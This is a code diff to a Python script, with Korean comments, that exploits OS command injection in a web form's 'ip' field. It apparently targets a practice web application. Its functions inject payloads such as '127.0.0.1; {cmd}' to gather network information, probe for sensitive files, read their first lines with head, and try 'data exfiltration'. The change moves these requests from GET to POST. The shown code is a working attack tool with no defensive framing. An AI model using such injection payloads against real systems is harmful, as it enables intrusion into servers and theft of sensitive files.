@@ -136,9 +136,9 @@ def collect_network_info(session, delay):
 
             try:
                 payload = f"127.0.0.1; {cmd}"
-                params = {'ip': payload, 'Submit': 'Submit'}
+                data = {'ip': payload, 'Submit': 'Submit'}
 
-                response = session.session.get(cmdi_url, params=params)
+                response = session.session.post(cmdi_url, data=data)
 
                 if len(response.text) > 500:  # 명령어 실행 결과가 있는 경우
                     results['successful'] += 1
@@ -186,9 +186,9 @@ def search_sensitive_files(session, delay):
                 # 파일 존재 여부 확인
                 check_cmd = f"test -f {filepath} && echo 'EXISTS' || echo 'NOT_FOUND'"
                 payload = f"127.0.0.1; {check_cmd}"
-                params = {'ip': payload, 'Submit': 'Submit'}
+                data = {'ip': payload, 'Submit': 'Submit'}
 
-                response = session.session.get(cmdi_url, params=params)
+                response = session.session.post(cmdi_url, data=data)
 
                 if 'EXISTS' in response.text:
                     results['successful'] += 1
@@ -224,9 +224,9 @@ def preview_file_content(session, filepath, delay):
         # 더 많은 내용을 가져오도록 수정 (20줄)
         preview_cmd = f"head -n 20 {filepath}"
         payload = f"127.0.0.1; {preview_cmd}"
-        params = {'ip': payload, 'Submit': 'Submit'}
+        data = {'ip': payload, 'Submit': 'Submit'}
 
-        response = session.session.get(cmdi_url, params=params)
+        response = session.session.post(cmdi_url, data=data)
 
         if response.status_code == 200:
             # HTML에서 실제 명령어 출력 추출
@@ -437,9 +437,9 @@ def attempt_data_exfiltration(session, delay):
 
         try:
             payload = f"127.0.0.1; {target['command']}"
-            params = {'ip': payload, 'Submit': 'Submit'}
+            data = {'ip': payload, 'Submit': 'Submit'}
 
-            response = session.session.get(cmdi_url, params=params)
+            response = session.session.post(cmdi_url, data=data)
 
             # HTML에서 실제 명령어 출력 추출 (첫 번째 요청은 디버그 모드)
             is_first = (results['attempts'] == 1)
